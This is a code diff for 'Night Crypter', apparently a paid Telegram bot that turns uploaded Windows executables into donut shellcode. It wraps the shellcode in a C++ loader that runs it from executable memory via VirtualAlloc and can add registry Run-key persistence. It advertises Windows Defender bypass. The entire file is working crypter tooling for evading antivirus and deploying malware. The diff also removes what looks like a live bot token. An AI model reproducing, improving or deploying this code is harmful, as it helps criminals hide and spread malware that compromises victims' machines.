@@ -1,4 +1,4 @@
-# bot.py (Updated with Donut shellcode)
+# Night Crypter Telegram Bot
 import json
 import os
 from datetime import datetime, timedelta, time
@@ -8,6 +8,7 @@ import donut
 import warnings
 from telegram.warnings import PTBUserWarning
 import pytz
+import aiofiles
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application,
@@ -20,8 +21,13 @@ from telegram.ext import (
 )
 
 # ========== SETTINGS ==========
-TOKEN = "8288860382:AAEBxNpEl81cnGKnOmauGEmMm7XkblkePYA"
-ADMIN_ID = 7279467950  # Your Telegram ID
+# IMPORTANT: Replace "YOUR_TELEGRAM_BOT_TOKEN" with your actual bot token.
+# It is recommended to load the token from an environment variable for security.
+# For example: TOKEN = os.getenv("TELEGRAM_TOKEN")
+TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
+# IMPORTANT: Replace 0 with your actual Telegram user ID.
+# For example: ADMIN_ID = int(os.getenv("ADMIN_ID"))
+ADMIN_ID = 0
 USERS_FILE = "json/users.json"
 TIMEZONE = "Europe/Istanbul"
 tzinfo = pytz.timezone(TIMEZONE)
@@ -34,31 +40,32 @@ MAX_FILE_SIZE = 8 * 1024 * 1024  # 8 MB limit
 
 # ============================
 
-# ---------- JSON Operations ----------
-def ensure_file(path: str, default):
+# ---------- JSON Operations (Async) ----------
+async def ensure_file(path: str, default):
     folder = os.path.dirname(path)
     if folder and not os.path.exists(folder):
         os.makedirs(folder, exist_ok=True)
     if not os.path.exists(path):
-        with open(path, "w", encoding="utf-8") as f:
-            json.dump(default, f, indent=4, ensure_ascii=False)
+        async with aiofiles.open(path, "w", encoding="utf-8") as f:
+            await f.write(json.dumps(default, indent=4, ensure_ascii=False))
 
-def load_json(path: str) -> Dict[str, Any]:
-    ensure_file(path, {})
-    with open(path, "r", encoding="utf-8") as f:
+async def load_json(path: str) -> Dict[str, Any]:
+    await ensure_file(path, {})
+    async with aiofiles.open(path, "r", encoding="utf-8") as f:
+        content = await f.read()
         try:
-            return json.load(f)
+            return json.loads(content)
         except json.JSONDecodeError:
             return {}
 
-def save_json(path: str, data) -> None:
-    ensure_file(path, data if isinstance(data, dict) else {})
-    with open(path, "w", encoding="utf-8") as f:
-        json.dump(data, f, indent=4, ensure_ascii=False)
+async def save_json(path: str, data) -> None:
+    await ensure_file(path, data if isinstance(data, dict) else {})
+    async with aiofiles.open(path, "w", encoding="utf-8") as f:
+        await f.write(json.dumps(data, indent=4, ensure_ascii=False))
 
-# ---------- User Functions ----------
-def ensure_user_record(user_id: int) -> None:
-    users = load_json(USERS_FILE)
+# ---------- User Functions (Async) ----------
+async def ensure_user_record(user_id: int) -> None:
+    users = await load_json(USERS_FILE)
     key = str(user_id)
     if key not in users:
         users[key] = {
@@ -67,7 +74,7 @@ def ensure_user_record(user_id: int) -> None:
             "daily_used": 0,
             "daily_limit": 1
         }
-        save_json(USERS_FILE, users)
+        await save_json(USERS_FILE, users)
 
 def iso_now_plus_days(days: int) -> str:
     return (datetime.now(tzinfo) + timedelta(days=days)).isoformat()
@@ -85,18 +92,18 @@ def human_dt(dt: Optional[datetime]) -> str:
         return "Not active"
     return dt.strftime("%d.%m.%Y %H:%M")
 
-def set_expiry(user_id: int, plan: str, days: int) -> bool:
-    users = load_json(USERS_FILE)
+async def set_expiry(user_id: int, plan: str, days: int) -> bool:
+    users = await load_json(USERS_FILE)
     key = str(user_id)
     if key not in users:
-        ensure_user_record(user_id)
-        users = load_json(USERS_FILE)
+        await ensure_user_record(user_id)
+        users = await load_json(USERS_FILE)
     expiry_iso = iso_now_plus_days(days)
     if plan == "a":
         users[key]["a_expiry"] = expiry_iso
     else:
         return False
-    save_json(USERS_FILE, users)
+    await save_json(USERS_FILE, users)
     return True
 
 def expiry_status_for_display(expiry_iso: Optional[str]) -> str:
@@ -110,18 +117,18 @@ def expiry_status_for_display(expiry_iso: Optional[str]) -> str:
         return "Expired"
     return human_dt(dt)
 
-def set_daily_limit(user_id: int, limit: int) -> None:
-    users = load_json(USERS_FILE)
+async def set_daily_limit(user_id: int, limit: int) -> None:
+    users = await load_json(USERS_FILE)
     key = str(user_id)
     if key not in users:
-        ensure_user_record(user_id)
-        users = load_json(USERS_FILE)
+        await ensure_user_record(user_id)
+        users = await load_json(USERS_FILE)
     users[key]["daily_limit"] = int(limit)
-    save_json(USERS_FILE, users)
+    await save_json(USERS_FILE, users)
 
-def has_active_subscription(user_id: int) -> bool:
+async def has_active_subscription(user_id: int) -> bool:
     """Checks if a user has an active, non-expired subscription."""
-    users = load_json(USERS_FILE)
+    users = await load_json(USERS_FILE)
     key = str(user_id)
     if key not in users:
         return False
@@ -136,40 +143,39 @@ def has_active_subscription(user_id: int) -> bool:
 
     return expiry_dt > datetime.now(tzinfo)
 
-def can_user_crypt(user_id: int) -> bool:
+async def can_user_crypt(user_id: int) -> bool:
     """Checks if the user is below their daily crypt limit."""
-    users = load_json(USERS_FILE)
+    users = await load_json(USERS_FILE)
     key = str(user_id)
     if key not in users:
-        ensure_user_record(user_id)
-        users = load_json(USERS_FILE)
+        await ensure_user_record(user_id)
+        users = await load_json(USERS_FILE)
     used = users[key].get("daily_used", 0)
     limit = users[key].get("daily_limit", 1)
     return used < limit
 
-def increment_crypt_count(user_id: int) -> None:
+async def increment_crypt_count(user_id: int) -> None:
     """Increments the daily crypt count for a user."""
-    users = load_json(USERS_FILE)
+    users = await load_json(USERS_FILE)
     key = str(user_id)
     if key not in users:
-        # This should not happen if can_user_crypt was called first, but as a safeguard:
-        ensure_user_record(user_id)
-        users = load_json(USERS_FILE)
+        await ensure_user_record(user_id)
+        users = await load_json(USERS_FILE)
 
     used = users[key].get("daily_used", 0)
     users[key]["daily_used"] = used + 1
-    save_json(USERS_FILE, users)
+    await save_json(USERS_FILE, users)
 
 async def reset_all_daily_used(context: ContextTypes.DEFAULT_TYPE) -> None:
     """Resets the daily crypt count for all users."""
-    users = load_json(USERS_FILE)
+    users = await load_json(USERS_FILE)
     changed = False
     for uid, u in users.items():
         if u.get("daily_used", 0) != 0:
             u["daily_used"] = 0
             changed = True
     if changed:
-        save_json(USERS_FILE, users)
+        await save_json(USERS_FILE, users)
         print("Daily crypt counts have been reset for all users.")
 
 # ---------- Helper: User Stubs Directory ----------
@@ -179,23 +185,39 @@ def user_stub_dir(user_id: int) -> str:
     return path
 
 # ---------- Bot Handlers ----------
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    if user is None:
-        return
-    ensure_user_record(user.id)
+async def edit_message_smart(query, text: str, reply_markup: Optional[InlineKeyboardMarkup] = None):
+    """Edits a message, handling both text and photo messages."""
+    try:
+        if query.message.photo:
+            await query.edit_message_caption(caption=text, reply_markup=reply_markup)
+        else:
+            await query.edit_message_text(text=text, reply_markup=reply_markup)
+    except Exception as e:
+        print(f"Error while editing message: {e}")
+        await query.message.reply_text(text, reply_markup=reply_markup)
+
+async def send_main_menu(context: ContextTypes.DEFAULT_TYPE, chat_id: int):
+    """Sends the main menu with the banner if available."""
     keyboard = [
         [InlineKeyboardButton("Profile", callback_data="profile")],
         [InlineKeyboardButton("Plans", callback_data="plans")],
         [InlineKeyboardButton("Crypter", callback_data="crypter")]
     ]
-    reply = InlineKeyboardMarkup(keyboard)
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    text = "🌙 Night Crypter\n\nWelcome! Please select an option from the menu below."
 
     banner_path = "assets/banner.png"
     if os.path.exists(banner_path):
-        await update.message.reply_photo(photo=open(banner_path, 'rb'), caption="🌙 Night Crypter\n\nWelcome! Please select an option from the menu below.", reply_markup=reply)
+        await context.bot.send_photo(chat_id=chat_id, photo=open(banner_path, 'rb'), caption=text, reply_markup=reply_markup)
     else:
-        await update.message.reply_text("🌙 Night Crypter\n\nWelcome! Please select an option from the menu below.", reply_markup=reply)
+        await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup)
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if user is None:
+        return
+    await ensure_user_record(user.id)
+    await send_main_menu(context, update.effective_chat.id)
 
 async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -205,10 +227,10 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data = query.data
 
     uid = str(query.from_user.id)
-    users = load_json(USERS_FILE)
+    users = await load_json(USERS_FILE)
     user = users.get(uid)
     if not user:
-        await query.edit_message_text("Record not found. Please send /start.")
+        await edit_message_smart(query, "Record not found. Please send /start.")
         return
 
     if data == "profile":
@@ -223,36 +245,31 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"⭐ Subscription: {a_disp}\n\n"
             f"🔁 Daily Crypt: {daily_used}/{daily_limit}\n"
         )
-        await query.edit_message_text(text, reply_markup=reply)
+        await edit_message_smart(query, text, reply)
 
     elif data == "plans":
         keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
         reply = InlineKeyboardMarkup(keyboard)
         text = "Contact the admin to purchase a subscription."
-        await query.edit_message_text(text, reply_markup=reply)
+        await edit_message_smart(query, text, reply)
 
     elif data == "crypter":
-        if has_active_subscription(query.from_user.id):
+        if await has_active_subscription(query.from_user.id):
             text = "✅ Subscription active (WD Bypass).\n\nPlease upload your .exe file to encrypt it."
         else:
             text = "❌ You do not have an active subscription.\n\nPlease contact the admin to purchase one."
 
         keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
         reply = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(text, reply_markup=reply)
+        await edit_message_smart(query, text, reply)
 
     elif data == "back":
-        keyboard = [
-            [InlineKeyboardButton("Profile", callback_data="profile")],
-            [InlineKeyboardButton("Plans", callback_data="plans")],
-            [InlineKeyboardButton("Crypter", callback_data="crypter")]
-        ]
-        reply = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text("🌙 Night Crypter\n\nWelcome! Please select an option from the menu below.", reply_markup=reply)
+        await query.message.delete()
+        await send_main_menu(context, query.message.chat_id)
 
 # ---------- Admin and User Commands ----------
 async def grant_a_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
+    if not ADMIN_ID or update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("Only the admin can use this command.")
         return
     args = context.args
@@ -265,17 +282,17 @@ async def grant_a_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except ValueError:
         await update.message.reply_text("user_id and days must be integers.")
         return
-    if set_expiry(target, "a", days):
-        expiry = load_json(USERS_FILE)[str(target)]["a_expiry"]
+    if await set_expiry(target, "a", days):
+        users = await load_json(USERS_FILE)
+        expiry = users[str(target)]["a_expiry"]
         await update.message.reply_text(f"Plan A granted -> {target} expiry: {expiry}")
         try:
             await context.bot.send_message(target, f"🎉 You have been granted Plan A (WD Killer). Expiry: {expiry}")
         except Exception:
             pass
 
-
 async def set_daily_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
+    if not ADMIN_ID or update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("Only the admin can use this command.")
         return
     if len(context.args) < 2:
@@ -287,15 +304,13 @@ async def set_daily_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except ValueError:
         await update.message.reply_text("user_id and limit must be integers.")
         return
-    set_daily_limit(target, limit)
+    await set_daily_limit(target, limit)
     await update.message.reply_text(f"User {target}'s daily limit has been set to {limit}.")
-
 
 # Conversation states
 GET_FILENAME, GET_STARTUP_CHOICE = range(2)
 
 async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Handles the initial file upload and starts the conversation."""
     msg = update.message
     if msg is None or msg.document is None:
         return ConversationHandler.END
@@ -306,10 +321,9 @@ async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         return ConversationHandler.END
     uid = user.id
 
-    # Check the daily limit before proceeding
-    if not can_user_crypt(uid):
-        u_data = load_json(USERS_FILE).get(str(uid), {})
-        limit = u_data.get('daily_limit', 1)
+    if not await can_user_crypt(uid):
+        users = await load_json(USERS_FILE)
+        limit = users.get(str(uid), {}).get('daily_limit', 1)
         await msg.reply_text(f"You have already used your {limit} daily crypt(s). Please try again tomorrow.")
         return ConversationHandler.END
 
@@ -318,7 +332,6 @@ async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         return ConversationHandler.END
 
     udir = user_stub_dir(uid)
-    # Use a unique name for the original uploaded file to avoid conflicts
     input_path = os.path.join(udir, f"original_{doc.file_id}.exe")
 
     try:
@@ -329,19 +342,15 @@ async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         return ConversationHandler.END
 
     context.user_data['input_path'] = input_path
-
     await msg.reply_text("✅ File received. Please enter the desired name for your compiled file (e.g., 'my_payload.exe'):")
-
     return GET_FILENAME
 
 async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores the desired filename and asks about startup."""
     filename = update.message.text
     if not filename.lower().endswith('.exe'):
         filename += '.exe'
 
     context.user_data['output_filename'] = filename
-
     keyboard = [
         [
             InlineKeyboardButton("Yes", callback_data="startup_yes"),
@@ -349,54 +358,42 @@ async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
         ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-
     await update.message.reply_text(
         "Filename saved. Should the file be added to startup for persistence?",
         reply_markup=reply_markup
     )
-
     return GET_STARTUP_CHOICE
 
 async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores the startup choice, compiles, sends, cleans up, and ends."""
     query = update.callback_query
     await query.answer()
 
     startup = query.data == 'startup_yes'
-
     input_path = context.user_data.get('input_path')
     output_filename = context.user_data.get('output_filename')
 
     if not input_path or not output_filename:
-        await query.edit_message_text("Error: Missing data. Please start over by sending the file again.")
+        await edit_message_smart(query, "Error: Missing data. Please start over by sending the file again.")
         context.user_data.clear()
         return ConversationHandler.END
 
     uid = query.from_user.id
     udir = user_stub_dir(uid)
-    # Use a unique name for the cpp file
     cpp_file_path = os.path.join(udir, f"source_{uid}.cpp")
     compiled_exe_path = os.path.join(udir, f"compiled_{uid}.exe")
 
     try:
-        await query.edit_message_text("Processing your file... This may take a moment.")
-
+        await edit_message_smart(query, "Processing your file... This may take a moment.")
         shellcode_bytes = donut.create(file=input_path)
         shellcode_formatted = ', '.join([f'0x{b:02x}' for b in shellcode_bytes])
-
         app_name_for_registry = os.path.splitext(output_filename)[0]
-
-        # Conditionally create the line of C++ for the startup functionality
         startup_line = ""
         if startup:
-            # Note: The C++ string literal for the registry key requires double backslashes
-            # The app name needs to be in escaped quotes
             startup_line = f'char currentPath[MAX_PATH]; GetModuleFileName(NULL, currentPath, MAX_PATH); addToStartup(\\"{app_name_for_registry}\\", currentPath);'
 
         cpp_template = f'''
 #include <windows.h>
 #include <string.h>
-
 void addToStartup(const char* appName, const char* appPath) {{
     HKEY hKey;
     const char* runKey = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run";
@@ -405,14 +402,11 @@ void addToStartup(const char* appName, const char* appPath) {{
         RegCloseKey(hKey);
     }}
 }}
-
 unsigned char shellcode[] = {{
   {shellcode_formatted}
 }};
-
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
     {startup_line}
-
     void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (exec != NULL) {{
         memcpy(exec, shellcode, sizeof(shellcode));
@@ -430,53 +424,43 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         )
 
         if compile_result.returncode != 0:
-            await query.edit_message_text(f"Compilation error:\\n{compile_result.stderr}")
+            await edit_message_smart(query, f"Compilation error:\\n{compile_result.stderr}")
             return ConversationHandler.END
 
-        with open(compiled_exe_path, "rb") as f:
+        async with aiofiles.open(compiled_exe_path, "rb") as f:
             await context.bot.send_document(chat_id=uid, document=f, filename=output_filename)
 
-        # Increment the user's daily count now that the process is successful
-        increment_crypt_count(uid)
-
-        await query.edit_message_text("✅ File created and sent successfully.")
-
+        await increment_crypt_count(uid)
+        await edit_message_smart(query, "✅ File created and sent successfully.")
     except Exception as e:
         print(f"File processing error: {e}")
-        await query.edit_message_text(f"An error occurred while processing your file: {e}")
-
+        await edit_message_smart(query, f"An error occurred while processing your file: {e}")
     finally:
         for path in [input_path, cpp_file_path, compiled_exe_path]:
             if path and os.path.exists(path):
                 os.remove(path)
-
         context.user_data.clear()
-
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Cancels and ends the conversation."""
     await update.message.reply_text("Operation cancelled.")
-    # Cleanup any lingering data
     input_path = context.user_data.get('input_path')
     if input_path and os.path.exists(input_path):
         os.remove(input_path)
     context.user_data.clear()
     return ConversationHandler.END
 
-
-# ---------- Error Handler ----------
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
     print("Error:", context.error)
 
+async def post_init(application: Application) -> None:
+    await ensure_file(USERS_FILE, {})
 
 # =========== Main Start ===========
 def main():
-    ensure_file(USERS_FILE, {})
-
     app = Application.builder().token(TOKEN).build()
+    app.post_init = post_init
 
-    # Schedule the daily reset job
     job_queue = app.job_queue
     reset_time = time(hour=0, minute=0, second=0, tzinfo=tzinfo)
     job_queue.run_daily(reset_all_daily_used, time=reset_time, name="daily_reset_job")
@@ -492,18 +476,16 @@ def main():
 
     app.add_handler(conv_handler)
     app.add_handler(CommandHandler("start", start))
-    # Note: The main callback_handler for the menu buttons is still needed for profile, plans, etc.
     app.add_handler(CallbackQueryHandler(callback_handler))
     app.add_handler(CommandHandler("grant_a", grant_a_cmd))
     app.add_handler(CommandHandler("set_daily", set_daily_cmd))
-
     app.add_error_handler(error_handler)
 
     banner_text = """
     ---------------------------------------
        Night Crypter (Telegram Bot)
     
-    - 28.09.2025 - All Rights Reserved.
+    © 2025 Night Crypter. All rights reserved.
     
     - Made By Payload X Violent
     
